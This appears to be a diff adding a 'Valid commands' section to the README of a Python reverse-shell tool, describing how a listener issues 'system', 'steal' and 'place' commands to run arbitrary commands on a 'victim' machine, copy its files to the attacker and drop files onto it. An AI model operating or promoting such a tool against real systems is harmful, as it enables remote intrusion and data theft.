@@ -20,3 +20,22 @@ python3 listener.py
 ```
 python3 reverse-shell.py
 ```
+
+### Valid commands
+
+Once the reverse-shell has connected to the listener, you will be prompted to enter a command. Valid commands are:
+
+```
+system <command>
+```
+The system-command will send whatever command you give it as a parameter to the of the victim's machine, execute it, and send back the response.
+
+```
+steal /path/on/vitctim /path/on/attacker
+```
+The steal-command will send any file from the victims computer to the attacker and save it to the specified location.
+
+```
+place /path/on/vitctim /path/on/attacker
+```
+Place will let you place any file from the attacking machine on the target-system.
